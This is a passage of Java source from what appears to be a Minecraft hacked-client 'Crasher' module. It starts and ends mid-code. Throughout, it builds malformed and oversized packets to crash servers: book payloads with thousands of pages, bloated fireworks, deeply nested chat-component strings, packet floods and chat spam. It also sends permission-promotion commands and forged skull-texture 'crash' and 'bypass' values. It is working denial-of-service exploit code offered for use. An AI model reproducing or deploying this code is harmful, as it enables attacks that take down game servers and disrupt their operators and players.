                        Minecraft.getMinecraft().thePlayer.getEntityBoundingBox().minY + 9412 * index,
                        Minecraft.getMinecraft().thePlayer.posZ + 9412 * index, true));
            }
            Timer++;
                if (Timer == 3) {
                    toggle();
                }

        }
    }

    public void CustomPlayload2() {
        for (int j = 0; j < 10; ++j) {
            NBTTagList bookPages;
            bookPages = new NBTTagList();
            for (int i = 0; i < 16300; ++i) {
                bookPages.appendTag(new NBTTagString(""));
            }
            ItemStack bookObj = new ItemStack(Items.writable_book);
            bookObj.setTagInfo("pages", bookPages);
            PacketBuffer bufferbedit = new PacketBuffer(Unpooled.buffer());
            bufferbedit.writeItemStackToBuffer(bookObj);
            Minecraft.getMinecraft().thePlayer.sendQueue
                    .addToSendQueue(new C17PacketCustomPayload("MC|BEdit", bufferbedit));
            PacketBuffer bufferbsign = new PacketBuffer(Unpooled.buffer());
            bookObj.setItem(Items.written_book);
            bufferbsign.writeItemStackToBuffer(bookObj);
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BSign", bufferbsign));
        }
    }

    public void Firework() {
        try {
            ItemStack firework = new ItemStack(Items.fireworks);
            NBTTagCompound tagf = new NBTTagCompound();
            NBTTagCompound tage = new NBTTagCompound();
            NBTTagList list = new NBTTagList();
            int[] i = new int[64];
            for (int i2 = 0; i2 < 3260; i2++) {
                Arrays.fill(i, i2 + 1);
                NBTTagCompound tagx = new NBTTagCompound();
                tagx.setIntArray("Colors", i);
                list.appendTag(tagx);
            }
            tage.setTag("Explosions", list);
            tage.setByte("Flight", (byte) 2);
            tagf.setTag("Fireworks", tage);
            firework.setTagCompound(tagf);
            for (int i3 = 0; i3 < 100; ++i3) {
            }
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(Integer.MAX_VALUE, firework));
        } catch (Exception ex) {

        }
        toggle();
    }


    public void Respawn() {

        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C16PacketClientStatus(C16PacketClientStatus.EnumState.PERFORM_RESPAWN));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C09PacketHeldItemChange(Integer.MAX_VALUE));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C15PacketClientSettings("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}",
                Integer.MAX_VALUE + 1, EntityPlayer.EnumChatVisibility.SYSTEM, false, Integer.MAX_VALUE + 1));
    }

    public void Item() {
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.carrot)));
    }

    public void Item2() {

        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, new ItemStack(Items.diamond_sword)));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer(true));
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.wooden_sword)));
    }

    public void Labymod() {
        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        buffer.writeString("God-Client");
        Crasher.this.mc.getNetHandler().addToSendQueue((net.minecraft.network.Packet)new C17PacketCustomPayload("LABYMOD", buffer));
    }

    public void Laby2() {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeString("INFO");
        JsonObject object = new JsonObject();
        JsonObject ccpObject = new JsonObject();
        ccpObject.addProperty("version", "Unknown parameter passed at @NotNull with en_US in ServerListPing.java");
        object.add("ccp", (JsonElement)ccpObject);
        packetBuffer.writeString(object.toString());
        Crasher.this.mc.getNetHandler().addToSendQueue((net.minecraft.network.Packet)new C17PacketCustomPayload("LMC", packetBuffer));
    }


    public void Spam() {
        for (int i = 0; i < 2000; i++) {
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue((Packet) new C01PacketChatMessage((new Random()).toString()));
        }
        toggle();

    }

    public void Pex() {
        Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C01PacketChatMessage("/pex promote a a"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C01PacketChatMessage("/pex promote b b"));
        toggle();
    }

    public void Position() {

        Minecraft.getMinecraft().thePlayer.setPosition(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY + 0.3D, Minecraft.getMinecraft().thePlayer.posZ);
        final double x = Minecraft.getMinecraft().thePlayer.posX;
        final double y = Minecraft.getMinecraft().thePlayer.posY;
        final double z = Minecraft.getMinecraft().thePlayer.posZ;

        for (int i = 0; i < 3000; ++i) {
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999D, z, false));
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
        }
        Minecraft.getMinecraft().thePlayer.motionY = 0;

    }

    public void Entity() {
        try {


                if (Minecraft.getMinecraft().objectMouseOver.entityHit == null) {
                    PlayerUtils.sendMessage("kuke Bitte auf ein Entity");
                }
                if (TimeHelper.hasReached(1000)) {
                    if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
                        for (int i = 0; i < 600; i++) {
                            (Minecraft.getMinecraft().getNetHandler().getNetworkManager()).channel.writeAndFlush(new C02PacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit, C02PacketUseEntity.Action.INTERACT));
                        }
                        TimeHelper.reset();
                }

                }



        } catch (Throwable throwable) {
            return;
        }
    }

    public void head() {
        String crashValue = "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIifX19=";

        String bypassCrashValue = "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIgLm1vamFuZy5jb20ifX19=";

        String signature = "TaTCfzX88SXppibQNMCnycgaVcySC05piL5OM1e8DPoMa0ptnof0hX/Wdd2rITpJQ4ZRqK/1UvHADIjimoWhl/14VMnoF8C3yCQQiy/ylLmgLFKWYoLlRHE7bXCPs/L2lCEjPdQ8sIuiHSQtcNrFNfBO76EcvmCfa89/qPtFcSrx+OOh3m4O7RABni9xoTtG8xSorLwad09r/AgKYyxLg6gx2iaT4UlFuIAQ3hp51e3oVvpm+l2UfvTdpPEjs8M5QJqGJ6Sq4aWp/0KIP9T1asotvWRTxsWOemuzImuSRC1Sz+Q5XbGKbBXPTKkCLVGoM9TtqtBtcul9JpgAMxy5NdpEQTxZ/moT4kn8VNjKVIaYb27Fg8RkilMtKNVR8j5JBirjY+fYoV5KpdswlqYgc0uXYGC16Q+UQB6DK2x4SuUK3D1eVSvu6mqR8MwymvYXMwvhVT2za3Lrfc/SrZPiQ8A8EbY33rmfzYcHZqvYAPKbY+ynJJOAW8c5U485tSku3iofFiBZoO1fQR/rOeQ/Vn8j7x7UR+93QvsivFOpcoTNqp9EqvMXIjP6I7vu8zbits6z6+Qp+88QEOzN6HttKP7x4j3KYOmrch5YzXPi/5m3N95hcOeQvgWdd8F5fNjtMcXniaZze2If/s3mc4BUBj+XJmtm+oiADuW3TDOlrTg=";


        ItemStack item = new ItemStack(Items.skull, 1, 3);
        final NBTTagCompound base = new NBTTagCompound();
        base.setString("SkullOwner", "Aethereum404");
        final NBTTagCompound skullOwner = new NBTTagCompound();
        skullOwner.setString("Id", "6c3a735f433c4c5caae23211d7e7acdc");
        skullOwner.setString("Name", "Aethereum404");
        final NBTTagCompound display = new NBTTagCompound();
        display.setString("Name", "�4\"Gew\u00f6hnlicher\" �4Kopf");
        final NBTTagCompound properties = new NBTTagCompound();
        final NBTTagList textures = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        tag.setString("Signature", "TaTCfzX88SXppibQNMCnycgaVcySC05piL5OM1e8DPoMa0ptnof0hX/Wdd2rITpJQ4ZRqK/1UvHADIjimoWhl/14VMnoF8C3yCQQiy/ylLmgLFKWYoLlRHE7bXCPs/L2lCEjPdQ8sIuiHSQtcNrFNfBO76EcvmCfa89/qPtFcSrx+OOh3m4O7RABni9xoTtG8xSorLwad09r/AgKYyxLg6gx2iaT4UlFuIAQ3hp51e3oVvpm+l2UfvTdpPEjs8M5QJqGJ6Sq4aWp/0KIP9T1asotvWRTxsWOemuzImuSRC1Sz+Q5XbGKbBXPTKkCLVGoM9TtqtBtcul9JpgAMxy5NdpEQTxZ/moT4kn8VNjKVIaYb27Fg8RkilMtKNVR8j5JBirjY+fYoV5KpdswlqYgc0uXYGC16Q+UQB6DK2x4SuUK3D1eVSvu6mqR8MwymvYXMwvhVT2za3Lrfc/SrZPiQ8A8EbY33rmfzYcHZqvYAPKbY+ynJJOAW8c5U485tSku3iofFiBZoO1fQR/rOeQ/Vn8j7x7UR+93QvsivFOpcoTNqp9EqvMXIjP6I7vu8zbits6z6+Qp+88QEOzN6HttKP7x4j3KYOmrch5YzXPi/5m3N95hcOeQvgWdd8F5fNjtMcXniaZze2If/s3mc4BUBj+XJmtm+oiADuW3TDOlrTg=");
        tag.setString("Value", "eyJ0aW1lc3RhbXAiOjE1MTMxMTk1ODUzODgsInByZm9sZUlkIjoiNmMzYTczNWY0MzNjNGM1Y2FhZTIzMjExZDdlN2FjZGMiLCJwcm9maWxlTmFtZSI6IkFldGhlcmV1bTQwNCIsInNpZ25hdHVyZVJlcXVpcmVkIjpmYWxzZSwidGV4dHVyZXMiOnsiU0tJTiI6eyJ1cmwiOiIgLm1vamFuZy5jb20ifX19=");
        item.setTagCompound(base);
        textures.appendTag(tag);
        properties.setTag("textures", textures);
        skullOwner.setTag("Properties", properties);
        base.setTag("SkullOwner", skullOwner);
        base.setTag("display", display);
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue((Packet) new C10PacketCreativeInventoryAction(5, item));

        toggle();
    }

    public void Place() {
        for (int c = 0; c < 30; ++c) {
            NBTTagCompound comp = new NBTTagCompound();
            NBTTagList list = new NBTTagList();

            for (int i = 0; i < 2; ++i) {
                list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{e